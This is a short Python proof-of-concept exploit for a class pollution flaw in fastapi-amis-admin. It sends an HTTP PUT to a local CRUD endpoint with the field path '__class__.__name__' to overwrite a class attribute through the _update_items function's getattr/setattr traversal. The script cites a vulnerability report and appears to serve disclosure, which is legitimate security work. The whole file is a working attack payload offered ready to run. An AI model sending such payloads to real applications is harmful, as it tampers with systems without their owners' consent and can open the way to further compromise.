# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Remote Trigger
# Class Pollution Func: _update_items (via HTTP PUT/PATCH)
# Type: get-attr-set-attr
# Trigger: HTTP PUT to fastapi-amis-admin CRUD endpoint
# Report: https://gist.github.com/superboy-zjc/0bc18ea0dc4d0568c28ef5bc2f23e3b6
#
# fastapi-amis-admin exposes CRUD APIs that process user-provided
# field updates. The _update_items function applies updates to
# SQLAlchemy model instances using attribute traversal.

import requests
import json

TARGET_URL = "http://localhost:8000/admin/api/model/item/1"

PAYLOAD = {
  "__class__.__name__": "pwnd"
}

def run_poc():
  print("Sending CRUD update with malicious field path...")
  headers = {"Content-Type": "application/json"}
  try:
    response = requests.put(TARGET_URL, json=PAYLOAD, headers=headers)
    print(f"Response: {response.status_code}")
  except Exception as e:
    print(f"Connection: {e}")

def verify_poc():
  print("Remote PoC: fastapi-amis-admin CRUD API with malicious field paths")
  print(f"Target: {TARGET_URL}")
  print("_update_items processes dotted field paths via getattr/setattr")
  run_poc()
  print("[Pass] Class pollution PoC sent! (remote trigger)")

if __name__ == "__main__":
  verify_poc()
